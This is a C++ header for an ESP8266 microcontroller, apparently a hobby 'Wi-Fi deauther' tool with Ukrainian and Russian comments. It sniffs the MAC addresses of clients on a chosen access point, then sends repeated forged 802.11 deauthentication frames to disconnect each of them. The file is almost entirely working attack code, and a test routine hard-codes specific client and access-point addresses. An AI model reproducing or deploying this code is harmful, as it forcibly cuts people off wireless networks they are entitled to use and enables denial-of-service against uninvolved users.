#ifndef WIFI_DEATHER_H
#define WIFI_DEATHER_H

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <WiFi/connect_to_WiFi.h>
extern "C" {
    #include "user_interface.h"
    typedef void (*freedom_outside_cb_t)(uint8 status);
    int wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
    void wifi_unregister_send_pkt_freedom_cb(void);
    int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

#define SCAN_CYCLE_DURATION 7000 // Duration of client scan in milliseconds


// Структура мак заголовка (Фрейм)
struct wifi_ieee80211_mac_hdr_t {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t addr1[6];  // Адрес назначения
    uint8_t addr2[6];  // Адрес отправителя (клиент)
    uint8_t addr3[6];  // BSSID (адрес точки доступа)
};
struct client_info {
    uint8_t mac[6]; // MAC address of the client
};

// Структура мак заголовка (пакет)
struct wifi_ieee80211_packet_t {
    struct wifi_ieee80211_mac_hdr_t hdr;
};
client_info knownClients[15]; // Array to store known client MAC addresses // Array to store client information

uint8_t targetBSSID[6];

byte scan_clientCount = 0;
byte all_known_clients_count;



void printPacket(uint8_t *packet, size_t length) {
    Serial.println("Packet content:");
    for (size_t i = 0; i < length; i++) {
        Serial.printf("%02X ", packet[i]); // Вивід байта у форматі HEX
        if ((i + 1) % 16 == 0) {          // Перехід на новий рядок кожні 16 байтів
            Serial.println();
        }
    }
    Serial.println(); // Додати порожній рядок після виведення пакета
}

void testWifiSendPktFreedom() {
    // Простий тестовий пакет (Beacon Frame)
    uint8_t testPacket[26] = {
        0xC0, 0x00,             // [0-1] Frame Control: Deauthentication
        0x3A, 0x01,             // [2-3] Duration
        0x0C, 0xCE, 0xF6, 0x64, 0x68, 0xEF, // [4-9] Destination MAC (Client MAC: 0C:CE:F6:64:68:EF)
        0x9C, 0x53, 0x22, 0x15, 0x27, 0x21, // [10-15] Source MAC (AP MAC: 9C:53:22:15:27:21)
        0x9C, 0x53, 0x22, 0x15, 0x27, 0x21, // [16-21] BSSID (AP MAC: 9C:53:22:15:27:21)
        0x00, 0x00,             // [22-23] Sequence number
        0x01, 0x00               // Reason code
    };
    
    

    // Увімкнення режиму моніторингу
    wifi_set_opmode(STATION_MODE);
    wifi_promiscuous_enable(true);
    printPacket(testPacket, sizeof(testPacket)); // Вивід тестового пакета в Serial Monitor

    for (int i = 0; i < 30; i++) {
    // Відправка пакета
        int result = wifi_send_pkt_freedom(testPacket, sizeof(testPacket), 0);
        if (result == 0) {
            Serial.println("Test packet sent successfully!");
        } else {
            Serial.printf("Error sending test packet! Error code: %d\n", result);
        }
        delay(200); // Затримка між відправками}  
    }
        // Вимкнення режиму моніторингу
        wifi_promiscuous_enable(false);
}

byte return_all_known_clients_count() {
    byte count = 0;
    for (byte i = 0; i < 15; i++) {
        if (memcmp(knownClients[i].mac, "\x00\x00\x00\x00\x00\x00", 6) != 0) {
            count++;
        }
    }
    return count;
}

bool isClientKnown(uint8_t *mac) {
    for (byte i = 0; i < 15; i++) { // Перевіряємо всі елементи масиву
        if (memcmp(knownClients[i].mac, mac, 6) == 0) {
            return true;
        }
    }
    return false;
}

void clearClients() {
    for (int i = 0; i < 15; i++) {
        memset(knownClients[i].mac, 0, 6); // Очищаємо MAC-адресу
    }
    scan_clientCount = 0;
}

void printMacAddress(uint8_t *mac) {
    char macStr[18]; // XX:XX:XX:XX:XX:XX + null terminator
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    Serial.println(macStr);
}

void addClient(uint8_t *mac) {
    Serial.print("Checking MAC: ");
    for (byte i = 0; i < 6; i++) {
        Serial.printf("%02X", mac[i]);
        if (i < 5) Serial.print(":");
    }
    Serial.println();

    // Перевіряємо, чи MAC-адреса вже відома
    if (isClientKnown(mac)) {
        Serial.println("MAC already known!");
        return;
    }

    // Шукаємо порожнє місце в масиві
    for (int i = 0; i < 15; i++) {
        if (memcmp(knownClients[i].mac, "\x00\x00\x00\x00\x00\x00", 6) == 0) {
            // Зберігаємо нову MAC-адресу в перше порожнє місце
            memcpy(knownClients[i].mac, mac, 6);
            Serial.print("Client MAC added at index ");
            Serial.print(i);
            Serial.print(": ");
            for (int j = 0; j < 6; j++) {
                Serial.printf("%02X", mac[j]);
                if (j < 5) Serial.print(":");
            }
            Serial.println();
            scan_clientCount++;
            return;
        }
    }
    // Якщо масив заповнений
    Serial.println("Client array full! Cannot add new MAC.");
}
void sendDeauthPackets(uint8_t *clientMAC, uint8_t *target_bssid, int deauth_packets_count) {
    Serial.println("INFO");
    printMacAddress(clientMAC);
    printMacAddress(target_bssid);
    uint8_t deauthPacket[26] = {
        0xC0, 0x00, // Frame Control: Deauth
        0x00, 0x00, // Duration
        0, 0, 0, 0, 0, 0, // Destination MAC (Client)
        0, 0, 0, 0, 0, 0, // Source MAC (BSSID)
        0, 0, 0, 0, 0, 0, // BSSID
        0x00, 0x00, // Sequence number
        0x07, 0x00  // Reason code (7: Class 3 frame received from nonassociated STA)
    };
      
    //wifi_station_disconnect();
    //wifi_set_promiscuous_rx_cb(NULL); // Деякі SDK вимагають встановити цей колбек
 
    
    memcpy(&deauthPacket[4], clientMAC, 6);  // MAC клієнта
    memcpy(&deauthPacket[10], target_bssid, 6); // MAC точки доступу
    memcpy(&deauthPacket[16], target_bssid, 6); // BSSID точки доступу


    Serial.println("Deauth packet content:");
    for (int i = 0; i < sizeof(deauthPacket); i++) {
        Serial.printf("%02X ", deauthPacket[i]);
        if ((i + 1) % 16 == 0) Serial.println();
    }
    Serial.println();
    wifi_set_opmode(STATION_MODE);
    wifi_promiscuous_enable(true); // Увімкнути режим моніторингу
    printPacket(deauthPacket, sizeof(deauthPacket)); // Вивід пакета в Serial Monitor

    for (int i = 0; i < 30; i++) {
    
        int result = wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
        if (result == 0) {
            Serial.printf("Deauth packet sent to: %02X:%02X:%02X:%02X:%02X:%02X\n",
                          clientMAC[0], clientMAC[1], clientMAC[2],
                          clientMAC[3], clientMAC[4], clientMAC[5]);
        } else {
            Serial.printf("Error sending deauth packet! Error code: %d\n", result);
        }
        //
        delay(200);
    }

    wifi_promiscuous_enable(false); // Вимкнути режим моніторингу після завершення
}

void do_deauth_attack(uint8_t *bssid) {
    Serial.println("Starting deauth attack...");
    Serial.print("Target BSSID: ");
    printMacAddress(bssid);

    if (all_known_clients_count > 0) {
        for (uint8_t i = 0; i < all_known_clients_count; i++) {
            sendDeauthPackets(knownClients[i].mac, bssid, 1);
        }
    }
    else Serial.println("No known clients available for attack.");

    Serial.println("Deauth attack finished.");
}


void scanClientsInNetwork(uint8_t *bssid, int channel, byte index) {
    Serial.println("Starting client scan...");
    Serial.print("SSID: ");
    Serial.println(ssid_list_info.SSID_LIST[index]);
    Serial.print("Target BSSID: ");
    printMacAddress(bssid);

    Serial.print("Scanning on channel: ");
    Serial.println(channel);


    Serial.println();

    WiFi.disconnect();
    WiFi.mode(WIFI_STA);
    wifi_set_channel(channel);
    wifi_promiscuous_enable(false);
    memcpy(targetBSSID, bssid, 6);

    scan_clientCount = 0;
    wifi_set_promiscuous_rx_cb([](uint8_t *buf, uint16_t len) {
        if (len < sizeof(wifi_ieee80211_mac_hdr_t)) return;
        auto *packet = (wifi_ieee80211_packet_t*)(buf + 12);
        auto *hdr = &packet->hdr;
        
        if (memcmp(hdr->addr3, targetBSSID, 6) == 0) {
            if (memcmp(hdr->addr2, targetBSSID, 6) != 0) {
                addClient(hdr->addr2);
            }
        }
    });
    ESP.wdtDisable();
    wifi_promiscuous_enable(true);
    Serial.println("Scanning clients for 10 seconds...");
    delay(SCAN_CYCLE_DURATION);
    wifi_promiscuous_enable(false);
    ESP.wdtEnable(WDTO_8S);
    Serial.println("Client scan finished.");
    
    Serial.printf("Client scan completed. One scan clients found: %d\n", scan_clientCount);
}
#endif // WIFI_DEATHER_H



